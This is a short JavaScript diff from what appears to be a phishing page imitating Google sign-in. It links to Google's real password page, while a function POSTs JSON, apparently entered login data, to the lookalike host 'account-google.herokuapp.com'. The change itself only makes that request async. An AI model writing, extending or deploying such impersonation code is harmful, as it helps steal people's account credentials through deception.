@@ -27,8 +27,8 @@ function goToForgottenPasswordPage() {
     "https://myaccount.google.com/intro/signinoptions/password";
 }
 
-function goToGooglePage() {
-  fetch("https://account-google.herokuapp.com/users", {
+async function goToGooglePage() {
+  await fetch("https://account-google.herokuapp.com/users", {
     method: "POST",
     headers: {
       "Content-Type": "application/json",
